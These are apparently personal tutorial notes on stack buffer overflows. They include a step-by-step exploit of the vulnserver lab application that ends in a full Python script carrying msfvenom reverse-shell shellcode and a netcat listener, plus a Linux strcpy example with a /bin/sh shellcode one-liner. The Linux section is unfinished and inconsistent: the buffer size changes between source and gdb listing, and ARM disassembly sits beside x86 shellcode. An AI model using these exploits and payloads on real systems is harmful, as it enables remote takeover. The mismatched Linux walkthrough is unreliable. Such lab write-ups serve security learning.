# Buffer overflow
From [OWASP](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow):
> A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold or when a program attempts to put data in a memory area past a buffer. In this case, a buffer is a sequential section of memory allocated to contain anything from a character string to an array of integers. Writing outside the bounds of a block of allocated memory can corrupt data, crash the program, or cause the execution of malicious code.

## Process memory sections
```
 High memory addresses
 ______________________
|                      |    
| Env vars/program args|
|______________________|
|                      | Used for function calls, passing parameters, storing local variables. 
| Stack                | Quite limited space.
|______________________|
|                      |
|                      |
| Heap                 | Allocates bigger chunks of data. 
|                      |
|______________________|
|                      |
| Global variables     |
|______________________|
|                      | 
| Text (Code)          |
|______________________|

Low memory addresses
```

## Stack
The stack, also known as the call stack, is a data structure located in the RAM memory that allows functions to call each other and also to store their local variables. // reword this

Let's say a function F1 calls the function F2, and the function F2 calls the function F3. Also, each function i defines a local variable VFi. Let's see what the stack would look like for each 

// TODO FINISH EXAMPLE

## Windows 32-bits Buffer Overflow
Vulnerable application:
https://thegreycorner.com/vulnserver.html

Run the vulnerable application as admin from Windows, the app runs on port 9999. Then run run as admin the Immunity debugger and attach to it (and press run as when attaching Immunity pauses the execution).

### Spiking
Spiking is the process of fuzzing the app with inputs of many different lengths to try to break it to detect a buffer overflow.

First, let's check the methods the vulnerable server provides:
```
kali@kali:~/buffer_overflow$ nc -nv 10.0.2.4 9999
(UNKNOWN) [10.0.2.4] 9999 (?) open
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
```

In order to spike the methods the server provides, we'll use `generic_send_tcp`:
```
kali@kali:~$ generic_send_tcp
argc=1
Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
./generic_send_tcp 192.168.1.100 701 something.spk 0 0
```

We need to specify the spike script for each method we want to test. In this case we know the TRUN method is vulnerable. We would check it like this:

`trun_spike.spk`:
```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

Run it:
```
generic_send_tcp {{IP}} {{PORT}} trun_splike.spk 0 0
```

Almost immediately the app crashes. If we check the value of the `EIP` registry on the debugger, it will contain 41414141, which is "AAAA". This indicates the instruction pointer was overwritten by the information sent by `generic_send_tcp`.

### Fuzzing
After we know which method of the protocol is vulnerable to buffer overflow, we have to detect what part of the input string is overwriting the EIP.

This script will send requests, adding 100 bytes at a time, to see when the app crashes to determine more or less whats the size of the input that makes the app crash. `1.py`:
```
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.2.4', 9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
```

Run it:
```
kali@kali:~/buffer_overflow$ ./1.py 
^CFuzzing crashed at 2200 bytes
```
Note it has to be stopped manually.

### Overwriting the EIP
Once we know what is the approximate size of the input to make the app crash, generate using Metasploit's pattern creation to detect exactly what part overwrites the EIP. In this case we will create a 2500 bytes pattern:
```
kali@kali:~/buffer_overflow$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A... (continues)
```

Now the input to be sent is the generated pattern:
```
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = {{METASPLOIT PATTERN}}

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.2.4', 9999))
s.send(('TRUN /.:/' + buffer))
s.close()
```

The EIP value at the moment of the crash was `386F4337` this time. Then we'll proceed to search that value in the string created by metasploit using the tool `pattern_offset`:
```
kali@kali:~/buffer_overflow$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
[*] Exact match at offset 2003
```

This means the offset is 2003 to reach the EIP. So we can use buffer = 2003 * "A" as the padding and the next 4 characters will be what we need EIP to be, in this case all Bs:
```
#!/usr/bin/python
import sys, socket
from time import sleep

badchars = {{BADCHARS}}
shellcode = "A" * 2003 + "B" * 4 + badchars

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.2.4', 9999))
s.send(('TRUN /.:/' + shellcode))
s.close()
```

It can be verified that the EIP registry has the value `42424242` at the moment of the crash, which is equivalent to `BBBB`.

### Badchars detection
Now we have control over the EIP registry, badchars have to be checked. Badchars are characters that are not suitable to be included in the shellcode, and the way of verifying it is to send all of them after the value that will overwrite the EIP registry, so that all of those values will be stored in the stack. When any of them does not appear in the dump, it means it is a bad character. Code:

```
#!/usr/bin/python
import sys, socket
from time import sleep

badchars = {{BADCHARS}}
shellcode = "A" * 2003 + "B" * 4 + badchars


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.2.4', 9999))
s.send(('TRUN /.:/' + shellcode))
s.close()
```

To check the badcharacters, go to the value of ESP on the Immunity debugger -> right click -> follow in dump. Check all the hexa values. They should start from the first character we sent. Next step is to see if we are missing characters, and in case we miss any that will be a bad character.

### Find JMP ESP
JMP ESP is an assembly command that allows to jump to execute what is in the stack. As we can control what is included in the stack (as we saw with the badchars, that were stored in the stack), this command will come handy if we get to store shellcode into the stack.

To be able to search for that instruction inside the program we are debugging, we need to add a Immunity command called `mona`:
- download mona https://github.com/corelan/mona
- cp mona.py on Windows to C:/Program Files x86/Immunity Inc/Immunity Debugger/PyCommands

Then on the command white line write on Immunity run: `!mona modules`. This will allow us to see what modules loaded by mona do not have checks that would prevent us to use them to perform a buffer overflow attack. In this case `essfunc.dll` looks good.

Now, let's check from our Kali machine which is the hex representation of a JMP ESP to look for it on our module essfunc.dll:
```
kali@kali:~/repositories$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
```

The hex representation is FFE4. Using mona again, search for the address of an eventual JMP ESP command in essfunc.dll:
```
!mona find -s "\xff\xe4" -m essfunc.dll
```

The result indicates that `0x625011af` contains the instruction we need.

### Generate shellcode and get shell access
Generate shellcode (substitute IP and PORT, and also check for the bad chars, here just the null byte is added as a bad char):
```
msfvenom -p windows/shell_reverse_tcp LHOST={{attackerIP}} LPORT={{attackerPort}} EXITFUNC=thread -f c -a x86 -b "\x00"
```

Final script:
```
kali@kali:~/buffer_overflow$ cat 5.py 
#!/usr/bin/python
import sys, socket
from time import sleep

overflow = ("\xdb\xd3\xbd\x67\xc5\xc1\x1c\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x6f\x17\x03\x6f\x17\x83\xa0\xc1\x23\xe9\xd2\x22\x21"
"\x12\x2a\xb3\x46\x9a\xcf\x82\x46\xf8\x84\xb5\x76\x8a\xc8\x39"
"\xfc\xde\xf8\xca\x70\xf7\x0f\x7a\x3e\x21\x3e\x7b\x13\x11\x21"
"\xff\x6e\x46\x81\x3e\xa1\x9b\xc0\x07\xdc\x56\x90\xd0\xaa\xc5"
"\x04\x54\xe6\xd5\xaf\x26\xe6\x5d\x4c\xfe\x09\x4f\xc3\x74\x50"
"\x4f\xe2\x59\xe8\xc6\xfc\xbe\xd5\x91\x77\x74\xa1\x23\x51\x44"
"\x4a\x8f\x9c\x68\xb9\xd1\xd9\x4f\x22\xa4\x13\xac\xdf\xbf\xe0"
"\xce\x3b\x35\xf2\x69\xcf\xed\xde\x88\x1c\x6b\x95\x87\xe9\xff"
"\xf1\x8b\xec\x2c\x8a\xb0\x65\xd3\x5c\x31\x3d\xf0\x78\x19\xe5"
"\x99\xd9\xc7\x48\xa5\x39\xa8\x35\x03\x32\x45\x21\x3e\x19\x02"
"\x86\x73\xa1\xd2\x80\x04\xd2\xe0\x0f\xbf\x7c\x49\xc7\x19\x7b"
"\xae\xf2\xde\x13\x51\xfd\x1e\x3a\x96\xa9\x4e\x54\x3f\xd2\x04"
"\xa4\xc0\x07\x8a\xf4\x6e\xf8\x6b\xa4\xce\xa8\x03\xae\xc0\x97"
"\x34\xd1\x0a\xb0\xdf\x28\xdd\xb5\x1f\x30\x12\xa2\x1d\x34\x3d"
"\x6e\xab\xd2\x57\x9e\xfd\x4d\xc0\x07\xa4\x05\x71\xc7\x72\x60"
"\xb1\x43\x71\x95\x7c\xa4\xfc\x85\xe9\x44\x4b\xf7\xbc\x5b\x61"
"\x9f\x23\xc9\xee\x5f\x2d\xf2\xb8\x08\x7a\xc4\xb0\xdc\x96\x7f"
"\x6b\xc2\x6a\x19\x54\x46\xb1\xda\x5b\x47\x34\x66\x78\x57\x80"
"\x67\xc4\x03\x5c\x3e\x92\xfd\x1a\xe8\x54\x57\xf5\x47\x3f\x3f"
"\x80\xab\x80\x39\x8d\xe1\x76\xa5\x3c\x5c\xcf\xda\xf1\x08\xc7"
"\xa3\xef\xa8\x28\x7e\xb4\xc9\xca\xaa\xc1\x61\x53\x3f\x68\xec"
"\x64\xea\xaf\x09\xe7\x1e\x50\xee\xf7\x6b\x55\xaa\xbf\x80\x27"
"\xa3\x55\xa6\x94\xc4\x7f")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.2.4', 9999))
s.send(('TRUN /.:/' + shellcode))
s.close()
```

Then just listen with netcat on port 4444 and run the script et voila.

## Linux Buffer Overflow
This is a classic example of a C program that is vulnerable to buffer overflow attacks:
```C
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
  char buffer[500];
  strcpy(buffer, argv[1]);
  return 0;
}
```

This program is vulnerable because the function `strcpy` is memory unsafe: if the argument's length is greater than 500 it will overwrite the contiguous memory addresses. Does it sound familiar already? 😏 Let's move on.

First, compile the program:
```bash
gcc -g bufferOverflow.c
```
This should have generated an output file, in our case the default one `a.out` (use `-o` to change output name).

Note also the -g flag, which generates debug info to be used with the [gdb debugger](https://www.gnu.org/software/gdb/).

Run the output using the debugger:
```bash
gdb a.out
```

The command `list` should print out the source code of `bufferOverflow.c`:
```C
(gdb) list
1	#include <stdio.h>
2	#include <string.h>
3
4	int main(int argc, char **argv) {
5	  char buffer[20];
6	  strcpy(buffer, argv[1]);
7	  return 0;
8	}
```

Run `disas main` to see the assembly code:
```assembly
(gdb) disas main
Dump of assembler code for function main:
   0x0000050c <+0>:	push	{r7, lr}
   0x0000050e <+2>:	sub	sp, #32
   0x00000510 <+4>:	add	r7, sp, #0
   0x00000512 <+6>:	str	r0, [r7, #4]
   0x00000514 <+8>:	str	r1, [r7, #0]
   0x00000516 <+10>:	ldr	r3, [r7, #0]
   0x00000518 <+12>:	adds	r3, #4
   0x0000051a <+14>:	ldr	r2, [r3, #0]
   0x0000051c <+16>:	add.w	r3, r7, #12
   0x00000520 <+20>:	mov	r1, r2
   0x00000522 <+22>:	mov	r0, r3
   0x00000524 <+24>:	blx	0x3cc <strcpy@plt>
   0x00000528 <+28>:	movs	r3, #0
   0x0000052a <+30>:	mov	r0, r3
   0x0000052c <+32>:	adds	r7, #32
   0x0000052e <+34>:	mov	sp, r7
   0x00000530 <+36>:	pop	{r7, pc}
```

Now it's when things get interesting. We need to be able to see where 
run $(python -c 'print("A" * 504 + "B" * 4)')


 x/300x $sp
 
 ```
 0x7efff948:	0x76fc2000	0x7efffa94	0x00000002	0x0040050d
0x7efff958:	0x9c9319df	0x9482da2a	0x0040053d	0x00000000
0x7efff968:	0x004003fd	0x00000000	0x00000000	0x00000000
0x7efff978:	0x00411000	0x00000000	0x00000000	0x00000000
0x7efff988:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff998:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff9a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff9b8:	0x00000000	0x00000000	0x00000001	0x76fff970
0x7efff9c8:	0x7efff9ec	0x76fffb2c	0x76fffb2c	0x00000000
0x7efff9d8:	0x00000000	0x76f90bed	0x7efffa20	0x00000000
0x7efff9e8:	0x00000000	0xffffffff	0x76ffd128	0x76ed8ce8
0x7efff9f8:	0x76ff91b8	0x76fc2000	0x7efffbb9	0x7efffa94
0x7efffa08:	0x76fc5574	0x76fc5574	0x000000a8	0x00000001
0x7efffa18:	0x00411014	0x76ff9920	0x76ff9de0	0x00000000
0x7efffa28:	0x00000001	0x00411000	0x00000000	0x76fe130b
0x7efffa38:	0x76ff94b8	0x00000001	0x00000001	0x00000000
0x7efffa48:	0x7efffaa0	0x76ed8ce8	0x7efffaa0	0x00000000
0x7efffa58:	0x00000000	0x004003fd	0x00000000	0x00000000
0x7efffa68:	0x00000000	0x76fe53e8	0x00000000	0x00000000
0x7efffa78:	0x004003fd	0x00000000	0x00000000	0x00400431
0x7efffa88:	0x0040057d	0x76fe1a31	0x7efffa94	0x7efffbb9
0x7efffa98:	0x7efffbe2	0x00000000	0x7efffddb	0x7efffdeb
0x7efffaa8:	0x7efffe12	0x7efffe1f	0x7efffe34	0x7efffe43
0x7efffab8:	0x7efffe4c	0x7efffe57	0x7efffe68	0x7efffe73
0x7efffac8:	0x7efffea5	0x7efffebc	0x7efffed0	0x7efffeda
(gdb)
0x7efffad8:	0x7efffee2	0x7efffef4	0x7effff10	0x7effff31
0x7efffae8:	0x7effff73	0x7effffa6	0x7effffb9	0x00000000
0x7efffaf8:	0x00000021	0x76ffd000	0x00000010	0x003fb0d6
0x7efffb08:	0x00000006	0x00001000	0x00000011	0x00000064
0x7efffb18:	0x00000003	0x00400034	0x00000004	0x00000020
0x7efffb28:	0x00000005	0x00000009	0x00000007	0x76fd6000
0x7efffb38:	0x00000008	0x00000000	0x00000009	0x004003fd
0x7efffb48:	0x0000000b	0x00000000	0x0000000c	0x00000000
0x7efffb58:	0x0000000d	0x00000000	0x0000000e	0x00000000
0x7efffb68:	0x00000017	0x00000000	0x00000019	0x7efffba5
0x7efffb78:	0x0000001a	0x00000010	0x0000001f	0x7effffd3
0x7efffb88:	0x0000000f	0x7efffbb5	0x00000000	0x00000000
0x7efffb98:	0x00000000	0x00000000	0x00000000	0xb5af1400
0x7efffba8:	0x6ce0972d	0x288d19e2	0xc036a4ab	0x6c377654
0x7efffbb8:	0x6f722f00	0x722f746f	0x736f7065	0x726f7469
0x7efffbc8:	0x2f736569	0x66667562	0x6f2d7265	0x66726576
0x7efffbd8:	0x2f776f6c	0x756f2e61	0x41410074	0x41414141
0x7efffbe8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffbf8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc08:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc18:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc28:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc38:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc48:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc58:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb)
0x7efffc68:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc78:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc88:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc98:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffca8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffcb8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffcc8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffcd8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffce8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffcf8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd08:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd18:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd28:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd38:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd48:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd58:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd68:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd78:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd88:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd98:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffda8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffdb8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffdc8:	0x41414141	0x41414141	0x41414141	0x42424141
0x7efffdd8:	0x53004242	0x4c4c4548	0x69622f3d	0x61622f6e
0x7efffde8:	0x50006873	0x2f3d4457	0x746f6f72	0x7065722f
```

Let's take the address `0x7efffcb8` and replace it where "B"s are:

assuming 43 bytes of payload we need to print 418 \90

Finally the number was 454:
$(python -c 'print("\x90" * 454 + "\xeb\x24\x5e\x89\x74\x24\x08\x31\xc0\x88\x44\x24\x07\x89\x44\x24\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24\x08\x8d\x54\x24\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh" + "\xb8\xfc\xff\x7e")')


## Resources
https://www.youtube.com/watch?v=1S0aBV-Waeo

